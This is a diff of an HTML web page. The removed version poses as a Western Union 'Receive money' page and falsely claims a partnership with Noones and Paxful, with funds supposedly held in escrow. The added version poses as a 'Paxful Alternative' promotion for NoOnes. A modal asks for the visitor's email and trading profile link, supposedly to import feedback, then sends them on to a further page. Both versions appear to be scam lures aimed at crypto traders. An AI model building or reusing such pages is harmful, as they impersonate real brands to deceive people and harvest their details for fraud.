@@ -2,148 +2,213 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Western Union - Receive Money</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paxful Alternative</title>
     <style>
-            body,
-        html {
-            height: 100%;
+        body {
+            font-family: Arial, sans-serif;
             margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
         }
         
-        .hero-section {
-            background: url('ee8901fd-1088-4e47-a61c-daf27e3cddef.png') no-repeat center center/cover;
-            height: 100vh;
-            color: white;
+        .container {
+            max-width: 800px;
+            margin: auto;
+            padding: 20px;
             text-align: center;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
         }
         
-        .overlay {
-            position: absolute;
-            top: 0;
+        h1 {
+            font-size: 24px;
+            color: #ff6f20;
+            margin-bottom: 10px;
+        }
+        
+        h2 {
+            font-size: 20px;
+            margin: 20px 0;
+        }
+        
+        .video-placeholder {
+            width: 100%;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .video-placeholder video {
+            width: 100%;
+            max-width: 640px;
+            height: auto;
+            border-radius: 10px;
+        }
+        
+        .button {
+            background-color: #ff6f20;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        
+        .button:hover {
+            background-color: #e65c1f;
+        }
+        
+        .section {
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 20px;
+            }
+            h2 {
+                font-size: 18px;
+            }
+        }
+        /* Modal Styles */
+        
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
             left: 0;
+            top: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.4);
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.6);
         }
         
-        .content {
-            position: relative;
-            z-index: 2;
+        .modal-content {
+            background-color: #fefefe;
+            margin: 10% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 10px;
+            text-align: left;
         }
         
-        .highlight {
-            color: #ffc107;
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
             font-weight: bold;
+            cursor: pointer;
         }
         
-        .btn-yellow {
-            background-color: #ffc107;
-            color: black;
-            font-weight: 600;
-        }
-        
-        .btn-yellow:hover {
-            background-color: #e0a800;
+        .close:hover {
             color: black;
         }
         
-        .logo {
-            position: absolute;
-            top: 20px;
-            left: 30px;
-            display: flex;
-            align-items: center;
-            z-index: 2;
+        .form-group {
+            margin: 10px 0;
         }
         
-        .logo img {
-            height: 40px;
-            margin-right: 10px;
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
         }
         
-        .logo span {
-            font-size: 24px;
-            font-weight: 600;
-            color: white;
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
         }
-        
-        .loader {
-            width: 70px;
-            aspect-ratio: 1;
-            background: radial-gradient(farthest-side, #ffa516 90%, #0000) center/16px 16px, radial-gradient(farthest-side, green 90%, #0000) bottom/12px 12px;
-            background-repeat: no-repeat;
-            animation: l17 1s infinite linear;
-            position: relative;
-            margin: 0 auto;
-        }
-        
-        .loader::before {
-            content: "";
-            position: absolute;
-            width: 8px;
-            aspect-ratio: 1;
-            inset: auto 0 16px;
-            margin: auto;
-            background: #ccc;
-            border-radius: 50%;
-            transform-origin: 50% calc(100% + 10px);
-            animation: inherit;
-            animation-duration: 0.5s;
-        }
-        
-        @keyframes l17 {
-            100% {
-                transform: rotate(1turn)
-            }
-            /* Tablet/Desktop */
-            @media (min-width: 768px) {
-                .container {
-                    flex-direction: row;
-                    gap: 1rem;
-                }
-            }
     </style>
 </head>
 
 <body>
+    <div class="container">
+        <h1>The Best Paxful Alternative</h1>
+        <h2>Welcome Paxful Users</h2>
 
-    <div class="hero-section">
-        <div class="overlay"></div>
-
-        <div class="logo">
-            <img src="/westernlogo.png" alt="Western Union Logo" />
-            <span>Western Union</span>
+        <div class="video-placeholder">
+            <video controls>
+                <source src="WhatsApp Video 2025-10-28 at 18.48.16_8f69af4f.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
         </div>
 
-        <div class="container content">
-            <h2 class="display-5"><span class="highlight">\\</span> Receive money</h2>
-            <p class="lead">Receive money at hundreds of thousands of our agent locations.</p>
-            <p>In 200 countries and territories<sup>1</sup> around the world.</p>
-            <div class="d-flex flex-column flex-md-row justify-content-center gap-3 mt-3">
-                <button class="btn btn-yellow" onclick="redirectToPage()">Receive Payment</button>
-                <button class="btn btn-yellow" onclick="redirectToPage()">Track Payment</button>
-            </div>
-            <div id="loaderContainer" class="mt-4" style="display:none;">
-                <div class="loader"></div>
-            </div>
-            <p class="mt-4">Noones and Paxful crypto trading platform has partnered with us on payment transfer through their visa cards. Your payment now is link to provided details in escrow.</p>
+        <button class="button" onclick="openModal()">Import your paxful feedbacks to noones</button>
+
+        <div class="section">
+            <h2>Why choose NoOnes?</h2>
+            <p>
+                <strong>VIP support and express disputes</strong><br> Get priority assistance and faster resolution for your requests. Our team is here 24/7 to protect your business.
+            </p>
+        </div>
+
+        <div class="section">
+            <p>
+                <strong>We will promote your offers</strong><br> Reach more buyers with robust visibility. Your listings will stand out with the strongest trading volume.
+            </p>
+        </div>
+
+        <div class="section">
+            <p>
+                <strong>Volume discounts for active traders</strong><br> Enjoy exclusive fee reductions for higher volumes. The more you trade, the more you save.
+            </p>
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Modal -->
+    <div id="feedbackModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <h2>Import feedback</h2>
+
+            <div class="form-group">
+                <label for="platform">1. Choose the platform to move feedback from</label>
+                <select id="platform">
+                    <option value="Paxful">Paxful</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="email">2. Enter your email</label>
+                <input type="email" id="email" placeholder="buygiftnow@gmail.com" required>
+            </div>
+
+            <div class="form-group">
+                <label for="profileLink">3. Add link to your profile elsewhere</label>
+                <input type="url" id="profileLink" placeholder="https://paxful.com/user/FoxyPanyu133" required>
+            </div>
+
+            <button class="button" onclick="redirectToIndex2()">connects with noones accounts</button>
+        </div>
+    </div>
+
     <script>
-        function redirectToPage() {
-            document.getElementById('loaderContainer').style.display = 'block';
-            setTimeout(function() {
-                window.location.href = 'noones.html';
-            }, 1500);
+        function openModal() {
+            document.getElementById('feedbackModal').style.display = 'block';
+        }
+
+        function closeModal() {
+            document.getElementById('feedbackModal').style.display = 'none';
+        }
+
+        function redirectToIndex2() {
+            // Add validation if necessary before redirect
+            window.location.href = 'index2.html';
+        }
+
+        window.onclick = function(event) {
+            const modal = document.getElementById('feedbackModal');
+            if (event.target === modal) {
+                closeModal();
+            }
         }
     </script>
 </body>
